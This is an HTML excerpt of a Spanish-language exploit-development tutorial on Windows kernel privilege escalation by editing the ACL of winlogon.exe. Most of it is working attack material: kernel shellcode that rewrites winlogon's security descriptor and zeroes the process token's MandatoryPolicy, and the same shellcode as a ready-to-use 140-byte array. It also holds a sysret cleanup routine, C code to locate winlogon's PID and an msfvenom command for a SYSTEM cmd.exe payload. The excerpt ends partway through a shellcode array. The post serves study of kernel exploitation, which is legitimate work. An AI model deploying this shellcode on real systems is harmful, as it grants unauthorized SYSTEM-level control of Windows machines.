<code><span class="o">    mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> -</span><span class="mi"> 0x8</span><span class="p">]</span><span class="c1">                    ; $rcx = SecurityDescriptor  
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; Clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> 0xb</span><span class="c1">              ; Authenticated Users</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de modificar la <code class="language-plaintext highlighter-rouge">ACL</code> de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> el siguiente paso seria crear un hilo y ejecutar un <code class="language-plaintext highlighter-rouge">shellcode</code> en modo usuario con privilegios de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, sin embargo al intentarlo obtenemos un error <code class="language-plaintext highlighter-rouge">5</code> de acceso denegado, esto se debe a que <code class="language-plaintext highlighter-rouge">winlogon.exe</code> se ejecuta en un nivel de integridad mas alto que <code class="language-plaintext highlighter-rouge">exploit.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[-] Error opening winlogon process: 5  </span>
</code></pre></div></div><br>

<p class="plain-text">Afortunadamente el problema no viene de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> sino de nuestro proceso, especificamente del <code class="language-plaintext highlighter-rouge">token</code>, este se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> del proceso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !process 0 0 exploit.exe
PROCESS ffff9a8e030ef080
    SessionId: 1  Cid: 1d88    Peb: c93d1dd000  ParentCid: 08fc
    DirBase: 071b0000  ObjectTable: ffffc60ba6d3ef00  HandleCount:  47.  
    Image: exploit.exe

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS ffff9a8e030ef080 Token
   +0x4b8 Token : _EX_FAST_REF</span>
</code></pre></div></div><br>

<p class="plain-text">Limpiando el ultimo byte podemos mostrar los atributos de la estructura <code class="language-plaintext highlighter-rouge">_TOKEN</code> que pertenece al proceso actual, el campo que nos da problemas esta en el offset <code class="language-plaintext highlighter-rouge">0xd4</code> y es <code class="language-plaintext highlighter-rouge">MandatoryPolicy</code> el cual tiene un valor asignado de <code class="language-plaintext highlighter-rouge">3</code> que ahora analizaremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_TOKEN (poi(0xffff9a8e030ef080 + 0x4b8) & 0xfffffffffffffff0)  
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffff9a8e`03179b90 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0xf
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x1e0
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 0
   +0x098 UserAndGroups    : 0xffffc60b`a1a534f0 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffffc60b`a842fa70 Void
   +0x0b0 DynamicPart      : 0xffffc60b`a842fa70  -> 0x501
   +0x0b8 DefaultDacl      : 0xffffc60b`a842fa8c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2a00
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0xe
   +0x0d4 MandatoryPolicy  : 3</span>
</code></pre></div></div><br>

<p class="plain-text">Segun <a href="https://learn.microsoft.com/es-es/windows/win32/api/winnt/ns-winnt-token_mandatory_policy#members">documentación</a> el valor <code class="language-plaintext highlighter-rouge">3</code> es una combinación de los 2 anteriores, el <code class="language-plaintext highlighter-rouge">1</code> nos dice que el proceso no puede escribir en proceso con un mayor nivel de integridad, afortunadamente podemos establecerlo en <code class="language-plaintext highlighter-rouge">0</code> para que no aplique ninguna directiva</p>
<a href="/exploit-development/windows-kernel/acl-editing/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/acl-editing/5.png"></p></div></a>

<p class="plain-text">Desde el shellcode podemos tomar el <code class="language-plaintext highlighter-rouge">token</code> del proceso actual, limpiamos el ultimo byte y finalmente modificamos el byte en el offset <code class="language-plaintext highlighter-rouge">0xd4</code> por <code class="language-plaintext highlighter-rouge">0x0</code> anulandolo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov </span><span class="mi">rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1">                  ; $rax = Process token  
    </span><span class="o">and </span><span class="mi">cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov </span><span class="no">byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0xd4</span><span class="p">],</span><span class="mi"> 0x0</span><span class="c1">              ; MandatoryPolicy</span>
</code></pre></div></div><br>

<p class="plain-text">Hasta ahora nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> se ve de esta forma, sin embargo aún tenemos un problema y es la salida de forma correcta donde tenemos varias opciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]</span><span class="c1">                     ; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]</span><span class="c1">                   ; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                            ; $rbx = _EPROCESS

    </span><span class="o">.</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">              ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> 0x448</span><span class="c1">                      ; $rbx = _EPROCESS</span><span class="p">
        </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">,</span><span class="mi"> 0x6e6f676f6c6e6977</span><span class="c1">         ; $rcx = "winlogon"
        </span><span class="o">cmp</span><span class="no"> qword</span><span class="p"> [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x5a8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">        ; ImageFileName == "winlogon"  
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                           ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> -</span><span class="mi"> 0x8</span><span class="p">]</span><span class="c1">                    ; $rcx = SecurityDescriptor
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; Clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> 0xb</span><span class="c1">              ; Authenticated Users

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1">                  ; $rax = Process token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0xd4</span><span class="p">],</span><span class="mi"> 0x0</span><span class="c1">              ; MandatoryPolicy

    </span><span class="o">xor</span><span class="mi"> rax</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                            ; $rax = STATUS SUCCESS
    </span><span class="o">ret</span><span class="c1">                                     ; return</span>
</code></pre></div></div><br>

</section>

<section class="post" id="cleanup">
<br><h3 class="post-title">Cleanup</h3><br>

<p class="plain-text">En lugar complicarnos intentando restaurar la pila podemos volver al modo de usuario, esto se explicó en el <a href="/exploit-development/windows-kernel/token-stealing/#cleanup">post</a> anterior y consiste en restaurar los registros desde la estructura <code class="language-plaintext highlighter-rouge">TrapFrame</code> a como nos conviene para posteriormente intercambiar el segmento <code class="language-plaintext highlighter-rouge">gs</code> y ejecutar el <code class="language-plaintext highlighter-rouge">sysret</code> para volver al modo de usuario, no sin antes establecer el valor de retorno en <code class="language-plaintext highlighter-rouge">eax</code> a <code class="language-plaintext highlighter-rouge">0</code> indicando que ha vuelto correctamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">                   ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">                  ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">                  ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">                  ; $r11 = ETHREAD.TrapFrame.EFlags  
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">                  ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> eax</span><span class="p">,</span><span class="mi"> eax</span><span class="c1">                            ; $eax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                                  ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                              ; return to usermode</span>
</code></pre></div></div><br>

<p class="plain-text">Tambien será necesario modificar el valor de <code class="language-plaintext highlighter-rouge">KernelApcDisable</code> para evitar un <code class="language-plaintext highlighter-rouge">BSOD</code> igualmente analizado un poco mas a detalle en una parte del <a href="/exploit-development/windows-kernel/token-stealing/#cleanup">post</a> anterior</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">                   ; $cx = KernelApcDisable  
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                                  ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">                   ; restore value</span>
</code></pre></div></div><br>

<p class="plain-text">Resumiendo, nuestro shellcode busca el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code> para modificar su <code class="language-plaintext highlighter-rouge">ACL</code> de forma que se asignen al grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> los privilegios de <code class="language-plaintext highlighter-rouge">System</code>, luego se anulan las directivas de integridad y retorna con <code class="language-plaintext highlighter-rouge">sysret</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]</span><span class="c1">                     ; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]</span><span class="c1">                   ; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                            ; $rbx = _EPROCESS

    </span><span class="o">.</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">              ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> 0x448</span><span class="c1">                      ; $rbx = _EPROCESS</span><span class="p">
        </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">,</span><span class="mi"> 0x6e6f676f6c6e6977</span><span class="c1">         ; $rcx = "winlogon"
        </span><span class="o">cmp</span><span class="no"> qword</span><span class="p"> [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x5a8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">        ; ImageFileName == "winlogon"
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                           ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> -</span><span class="mi"> 0x8</span><span class="p">]</span><span class="c1">                    ; $rcx = SecurityDescriptor
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; Clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> 0xb</span><span class="c1">              ; Authenticated Users

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1">                  ; $rax = Process token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">                            ; clear last byte
    </span><span class="o">mov</span><span class="no"> byte</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0xd4</span><span class="p">],</span><span class="mi"> 0x0</span><span class="c1">              ; MandatoryPolicy

    </span><span class="o">mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">                   ; $cx = KernelApcDisable
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                                  ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">                   ; restore value

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">                   ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">                  ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">                  ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">                  ; $r11 = ETHREAD.TrapFrame.EFlags  
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">                  ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> eax</span><span class="p">,</span><span class="mi"> eax</span><span class="c1">                            ; $eax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                                  ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                              ; return to usermode</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos compilarlo con <code class="language-plaintext highlighter-rouge">nasm</code> y pasarlo al formato que necesitamos para nuestro exploit, en total nuestro shellcode pesa un total de <code class="language-plaintext highlighter-rouge">140</code> bytes que es bastante bueno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf64 shellcode.asm -o shellcode.o;</span><span class="ve"> ld</span><span class="p"> shellcode.o -m elf_x86_64 -o shellcode

</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep</span><span class="am"> '[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep </span><span class="p">-v</span><span class="am"> 'shellcode' </span><span class="p">| </span><span class="ve">cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-7 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s</span><span class="am"> ' '</span><span class="p"> | </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> |</span><span class="ve"> sed</span><span class="am"> 's/ $//g' </span><span class="p">|</span><span class="ve"> sed </span><span class="am">'s/ /, 0x/g'</span><span class="p"> | </span><span class="ve">paste</span><span class="p"> -d </span><span class="am">'' </span><span class="p">-s |</span><span class="ve"> sed </span><span class="am">'s/^, //g'</span><span class="p">
0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00, 0x48, 0xb9, 0x77, 0x69, 0x6e, 0x6c, 0x6f, 0x67, 0x6f, 0x6e, 0x48, 0x39, 0x8b, 0xa8, 0x05, 0x00, 0x00, 0x75, 0xdf, 0x48, 0x8b, 0x4b, 0xf8, 0x80, 0xe1, 0xf0, 0xc6, 0x41, 0x48, 0x0b, 0x48, 0x8b, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0xc6, 0x81, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x8a, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x8a, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="usage">
<br><h3 class="post-title">Usage</h3><br>

<p class="plain-text">Su uso en un <code class="language-plaintext highlighter-rouge">exploit</code> real inicia por definir el shellcode como un array de <code class="language-plaintext highlighter-rouge">bytes</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> acl_editing[</span><span class="mi">140</span><span class="p">]</span><span class="o"> =</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">  
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">  
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0xb9</span><span class="p">,</span><span class="mi"> 0x77</span><span class="p">,</span><span class="mi">  
    0x69</span><span class="p">,</span><span class="mi"> 0x6e</span><span class="p">,</span><span class="mi"> 0x6c</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x67</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x6e</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x39</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa8</span><span class="p">,</span><span class="mi"> 0x05</span><span class="p">,</span><span class="mi">  
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xdf</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x4b</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0xc6</span><span class="p">,</span><span class="mi">  
    0x41</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi">  
    0xf0</span><span class="p">,</span><span class="mi"> 0xc6</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xd4</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi">  
    0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">  
    0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi">  
    0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi">  
    0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">  
    0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07  
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de modificar los privilegios de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> necesitaremos obtener su <code class="language-plaintext highlighter-rouge">PID</code> para crear un hilo a partir de el, para ello podemos escribir la siguiente función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">DWORD FindProcessId</span><span class="p">(</span><span class="o">const</span><span class="no"> wchar_t</span><span class="o"> *</span><span class="am">processName</span><span class="p">) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize</span><span class="o"> = sizeof</span><span class="p">(processInfo);

    </span><span class="na">HANDLE</span><span class="p"> processesSnapshot </span><span class="o">=</span><span class="p"> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,</span><span class="mi"> NULL</span><span class="p">);  
    </span><span class="o">if</span><span class="p"> (processesSnapshot</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
    }

    Process32First(processesSnapshot, </span><span class="o">&</span><span class="p">processInfo);
    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">wcscmp</span><span class="p">(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        </span><span class="o">return</span><span class="p"> processInfo.th32ProcessID;
    }

    </span><span class="o">while</span><span class="p"> (Process32Next(processesSnapshot, </span><span class="o">&</span><span class="p">processInfo)) {
        </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">wcscmp</span><span class="p">(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            </span><span class="o">return</span><span class="p"> processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Además necesitaremos un shellcode que nos ejecute una <code class="language-plaintext highlighter-rouge">cmd.exe</code>, este se ejecutará en modo de usuario con privilegios de <code class="language-plaintext highlighter-rouge">System</code>, podemos crearlo con <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/exec CMD=cmd.exe EXITFUNC=none -f csharp  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> cmd[</span><span class="mi">275</span><span class="p">]</span><span class="o"> =</span><span class="p"> {</span><span class="mi">
